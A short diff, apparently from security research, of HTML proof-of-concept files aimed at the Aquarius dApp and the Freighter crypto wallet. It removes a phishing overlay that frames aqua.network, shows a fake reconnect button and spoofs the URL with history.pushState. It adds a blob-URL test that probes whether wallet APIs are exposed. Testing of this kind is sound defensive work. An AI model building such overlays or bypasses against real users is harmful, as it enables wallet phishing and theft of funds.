@@ -1,19 +1,12 @@
-<!-- simpan sebagai chain.html di 0x403for.github.io -->
-<style>
-  body{margin:0}
-  #real{width:100%;height:100vh;border:none}
-  #fake{position:absolute;top:0;left:0;width:100%;height:100%;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center}
-</style>
-
-<iframe id="real" src="https://aqua.network"></iframe>
-
-<div id="fake">
-  <h2>aquarius</h2>
-  <p>Session expired, please reconnect</p>
-  <button onclick="alert('TRIGGER: freighterApi.signTransaction() akan dipanggil di sini\nIni Phishing High Severity')" style="background:#7b3fe4;color:white;padding:15px 30px">Connect Freighter</button>
-</div>
-
 <script>
-// Setelah 1 detik, ganti address bar biar keliatan aqua.network (spoof)
-setTimeout(()=>{ history.pushState({}, "", "/dapp/aqua.network") }, 500);
+// Simpan sebagai blob-bypass.html
+let html = `
+<script>
+alert("origin: "+location.origin);
+alert("freighter: "+!!window.freighterApi);
+alert("ethereum: "+!!window.ethereum);
+<\/script>
+`;
+let blob = new Blob([html], {type:"text/html"});
+location.href = URL.createObjectURL(blob);
 </script>
